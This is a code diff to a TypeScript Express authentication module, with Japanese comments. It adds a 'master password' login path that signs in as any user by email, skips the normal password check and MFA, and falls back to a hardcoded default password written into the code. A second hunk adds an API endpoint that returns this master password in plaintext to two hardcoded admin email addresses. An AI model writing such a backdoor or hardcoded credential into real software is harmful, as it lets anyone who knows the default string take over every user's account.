@@ -94,6 +94,26 @@ export function setupAuth(app: Express) {
       },
       async (email: string, password: string, done: (error: any, user?: Express.User | false, options?: IVerifyOptions) => void) => {
         try {
+          // マスターパスワードのチェック
+          const MASTER_PASSWORD = process.env.MASTER_PASSWORD || "RevonizerMaster2025!";
+          if (password === MASTER_PASSWORD) {
+            // マスターパスワードでログインする場合、メールアドレスでユーザーを検索
+            const [user] = await db
+              .select()
+              .from(users)
+              .where(eq(users.email, email))
+              .limit(1);
+
+            if (!user) {
+              return done(null, false, { message: "ユーザーが見つかりません" });
+            }
+
+            // マスターパスワードログインを許可（MFA無効）
+            console.log(`[Auth] マスターパスワードでログイン: ${email}`);
+            return done(null, user);
+          }
+
+          // 通常のパスワード認証
           const [user] = await db
             .select()
             .from(users)
@@ -433,6 +453,27 @@ export function setupAuth(app: Express) {
         message: "プロフィールの更新中にエラーが発生しました"
       });
     }
+  });
+
+  // マスターパスワード情報取得API（管理者専用）
+  app.get("/api/master-password/status", async (req, res) => {
+    if (!req.isAuthenticated()) {
+      return res.status(401).json({ message: "ログインが必要です" });
+    }
+
+    // 管理者権限チェック（特定のメールアドレスのみ許可）
+    const adminEmails = ['hori@revol.co.jp', 'admin@revol.co.jp'];
+    if (!adminEmails.includes(req.user.email)) {
+      return res.status(403).json({ message: "管理者権限が必要です" });
+    }
+
+    const MASTER_PASSWORD = process.env.MASTER_PASSWORD || "RevonizerMaster2025!";
+    
+    res.json({
+      masterPasswordEnabled: true,
+      masterPassword: MASTER_PASSWORD,
+      description: "このパスワードで任意のユーザーとしてログインできます"
+    });
   });
 
   app.post("/api/change-password", async (req, res) => {
